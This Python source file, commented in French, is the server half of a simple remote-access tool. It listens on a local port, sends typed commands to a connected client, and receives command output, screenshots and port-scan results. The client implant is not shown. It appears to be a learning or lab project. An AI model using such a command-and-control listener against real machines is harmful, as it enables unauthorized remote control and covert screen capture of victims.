import socket
from PIL import Image

ip_add = "127.0.0.1"
port = 3280

# Bind and listen socket
def listen_socket(s):
    s.bind((ip_add, port))
    s.listen(5)

# Accepter le socket
def accept_socket(s):
    print(f"Listening on {ip_add}:{port}")
    conn, address = s.accept()
    print(f"New connection from {address} !")
    send_command(conn)
    conn.close()

# Envoyer une commande
def send_command(conn):
    while True:
        
        command = input("> ")
        conn.send(command.encode("utf-8"))

        if command.lower() == "exit":
            print("Closing connection.")
            conn.close()
            break
        elif command == "capture":
            receive_screen(conn)
        elif command.startswith("scan"):
            receive_scan(conn)
        else:
            result = conn.recv(4096).decode("utf-8", errors="replace") # Recoie le résultat
            print(result)  # Affichage du résultat côté serveur
        
# Fonction qui recoit le screenshot
def receive_screen(conn):
    # Recoie la taille de l'image
    size = int.from_bytes(conn.recv(4), 'big')
    width = int.from_bytes(conn.recv(4), 'big')
    height = int.from_bytes(conn.recv(4), 'big')

    # Recoie les données de l'image
    img_data = b""
    while len(img_data) < size:
        img_data += conn.recv(4096)

    img = Image.frombytes("RGB", (width, height), img_data) # Reconstruit l'image et l'affiche
    img.show()

# Fonction qui recoit les résultats su scanner de port 
def receive_scan(conn):
    scan_result = conn.recv(4096)
    if scan_result:
        scan_result = scan_result.decode("utf-8", errors="replace")
        print(scan_result)


if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_socket(s)
        accept_socket(s)
    except:
        print(f"cannot listen on port : {port}")




   
